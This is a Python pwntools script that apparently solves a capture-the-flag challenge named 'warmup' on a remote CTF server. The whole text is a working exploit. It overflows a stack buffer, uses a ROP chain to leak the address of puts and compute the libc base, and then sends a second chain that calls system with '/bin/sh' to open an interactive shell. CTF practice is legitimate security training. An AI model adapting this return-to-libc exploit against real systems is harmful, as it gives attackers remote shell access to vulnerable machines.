from pwn import *

e = ELF("./warmup")
p = remote("nothing.chal.ctf.westerns.tokyo", 10001)

p.sendline("A" * 0x108 + p64(0x400773) + p64(e.got["puts"]) + p64(e.symbols["puts"]) + p64(e.symbols["main"]))

p.recvuntil("\x40")

leak = u64(p.recvline(keepends=False)[:8].ljust(8, "\x00"))
print("{:#x}".format(leak))

base = leak - 0x809c0
system = base + 0x4f440
print("{:#x}".format(base))
print("{:#x}".format(system))
binsh = base + 0x1b3e9a
p.sendline("A" * 0x108 + p64(0x400773) + p64(binsh) + p64(0x400771) + p64(0) + p64(0) + p64(system))

p.interactive()
